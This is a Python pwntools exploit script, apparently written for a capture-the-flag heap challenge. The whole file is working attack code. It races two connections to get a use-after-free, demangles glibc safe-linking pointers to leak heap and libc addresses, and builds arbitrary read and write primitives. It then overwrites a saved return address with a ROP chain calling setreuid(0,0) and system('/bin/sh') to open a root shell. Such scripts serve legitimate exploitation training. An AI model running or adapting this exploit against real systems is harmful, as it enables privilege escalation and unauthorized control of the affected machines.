from pwn import *
import os
import sys
import time

context.arch = 'amd64'
context.log_level = 'error'
libc = ELF("/challenge/lib/libc.so.6")

def mangle(target:int, ptr:int, page_offset=0)->int:
    return target ^ ((ptr >> 12) + page_offset)

def demangle(raw:int, page_offset=0)->int:
    pos = (raw >> 12) + page_offset
    m = pos ^ raw
    return m >> 24 ^ m

def warmup_heap(r):
    r.sendline(b'malloc 8')
    r.sendline(b'malloc 9')
    r.sendline(b'malloc 10')
    r.sendline(b'free 10')
    r.sendline(b'free 9')
    r.sendline(b'free 8')

def get_heap_leak(r1, r2):
    r1.clean()
    r2.clean()
    pid = os.fork()
    if pid == 0:
        # child
        for _ in range(100):
            r1.sendline(b'malloc 0 scanf 0 AAAAAAAABBBBBBBB free 0')
        sys.exit(0)
    for _ in range(100):
        r2.sendline(b'printf 0')
    os.wait()
    raw = r2.clean(1)
    for line in raw.splitlines():
        if b'NONE' not in line and b'\x7f' in line:
            print(line)
            leak = line.split(b'MESSAGE: ')[1]
            print(f'mangled leak = {hex(unpack(leak, "all"))}')
            return demangle(unpack(leak, 'all'), page_offset=-1)


idx = 1

def controlled_allocation(r1, r2, addr):
    global idx
    r1.clean()
    r2.clean()

    r1.sendline(f"malloc {idx} malloc {idx+1} free {idx+1}")
    while True:
        pid = os.fork()
        if pid == 0:
            # child
            r1.sendline(f"free {idx}")
            sys.exit(0)
        r2.send((f'scanf {idx} '.encode('utf-8') + p64(addr) + b'\n')*2000)
        os.wait()

        time.sleep(0.1)
        # if we successfully overwrote *next of the top chunk in the bin
        r1.sendline(f'malloc {idx} printf {idx}')
        r1.recvuntil(b'MESSAGE: ')
        result = r1.recvline()[:-1]
        print(f'result = {result}; expected = {p64(addr)}')
        if unpack(result, 'all') == addr:
            break

    r1.sendline(f'malloc {idx+1}')
    r1.clean()
    idx += 2

def arb_read(r1, r2, addr):
    # addr is already mangled
    # 0x20 is bad byte for scanf
    assert 0x20 not in set(p64(addr))

    controlled_allocation(r1, r2, addr)
    r1.sendline(f'printf {idx-1}')
    r1.recvuntil(b'MESSAGE: ')
    result = r1.recvline()[:-1]

    return result

def arb_write(r1, r2, addr, buf):
    # addr is already mangled
    # 0x20 is bad byte for scanf
    assert 0x20 not in set(p64(addr))

    controlled_allocation(r1, r2, addr)
    r1.sendline(f'scanf {idx-1} '.encode('utf-8') + buf)


#p = gdb.debug("/challenge/babyprime_level3.0", gdbscript=
#"""
#b *challenge+1355
#continue
#""")
p = process("/challenge/babyprime_level3.0")
time.sleep(1)

r1 = remote("127.0.0.1", 1337)
r2 = remote("127.0.0.1", 1337)
r3 = remote("127.0.0.1", 1337)
r4 = remote("127.0.0.1", 1337)

warmup_heap(r1)
warmup_heap(r2)
warmup_heap(r3)
warmup_heap(r4)

heap_leak = get_heap_leak(r1, r2)
print(f'heap_leak = {hex(heap_leak)}')

_IO_wfile_jumps_loc = heap_leak - 0x600
_IO_wfile_jumps = unpack(arb_read(r1, r2, mangle(_IO_wfile_jumps_loc, heap_leak, page_offset=-1)), 'all')
libc_base = _IO_wfile_jumps - libc.sym['_IO_wfile_jumps'] # 0x2160c0
libc.address = libc_base
print(f'libc_Base = {hex(libc_base)}')
saved_rip = libc_base - 0x41d8
print(f'saved_rip = {hex(saved_rip)}') # not safelink-aligned address
dummy_rbp = saved_rip - 0x8 + 0x30

payload = b'\x00'*0x10 + p64(dummy_rbp)

rop = ROP(libc, badchars=b"\x09\x0a\x0b\x0c\x0d\x0e\x20")
bin_sh = next(libc.search(b'/bin/sh'))
rop.setreuid(0, 0)
rop.system(bin_sh)

#rop.call("exit", [42])

payload += rop.chain()

# remove key by malloc
#secret_loc = saved_rip - 0x758
heap_leak_2 = get_heap_leak(r3, r4)
arb_write(r3, r4, mangle(saved_rip - 0x18, heap_leak_2, page_offset=-1), payload)
time.sleep(1)
r1.sendline(b"quit")

time.sleep(1)
#p.send(b"cat /flag")
#print(p.clean(2))

#print(f'saved_rip = {hex(saved_rip)}') # not safelink-aligned address
#print(f"Exited: {p.poll()}")
p.interactive()
